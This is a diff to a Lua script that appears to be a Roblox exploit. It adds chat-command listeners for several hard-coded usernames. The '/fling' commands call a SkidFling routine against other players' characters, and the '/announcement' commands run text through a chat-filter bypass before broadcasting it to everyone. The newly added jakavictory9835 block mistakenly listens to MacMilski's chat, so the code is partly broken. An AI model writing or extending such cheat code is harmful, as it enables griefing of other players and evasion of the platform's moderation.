@@ -345,7 +345,8 @@ function chatMessage(msg)
 	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
 end
 
-
+if game.Players:FindFirstChild("w4tvthbrrgrg5") then
+	task.spawn(function()
 game.Players.w4tvthbrrgrg5.Chatted:Connect(function(msg)
 	print(msg)
 	local message = string.lower(msg)
@@ -366,7 +367,9 @@ game.Players.w4tvthbrrgrg5.Chatted:Connect(function(msg)
 			chatMessage("Announcement from ".. game.Players.w4tvthbrrgrg5.DisplayName .. ": " .. bypassMessage(string.gsub(msg, "/announcement ", "")))
 		end
 	end
+				end)
 end)
+end
 
 if game.Players:FindFirstChild("MacMilski") then
   task.spawn(function()
@@ -388,6 +391,32 @@ if game.Players:FindFirstChild("MacMilski") then
 						end
 					elseif message:match("announcement") then
 						chatMessage("Announcement from ".. game.Players.MacMilski.DisplayName .. ": " .. bypassMessage(string.gsub(msg, "/announcement ", "")))
+					end
+				end
+			end)
+		end)
+end
+
+if game.Players:FindFirstChild("jakavictory9835") then
+  task.spawn(function()
+			game.Players.MacMilski.Chatted:Connect(function(msg)
+				print(msg)
+				local message = string.lower(msg)
+				print(message)
+				if message:match("/") then
+					print("first check passed match")
+					local splitMessage = string.split(message, " ")
+					print(splitMessage[2])
+					if message:match("fling") then
+						print("second check passed match")
+						local player = getPlr(splitMessage[2])
+						print("got player or smth")
+						if player and player.Character then
+							print("found char")
+							SkidFling(player)
+						end
+					elseif message:match("announcement") then
+						chatMessage("Announcement from ".. game.Players.jakavictory9835.DisplayName .. ": " .. bypassMessage(string.gsub(msg, "/announcement ", "")))
 					end
 				end
 			end)
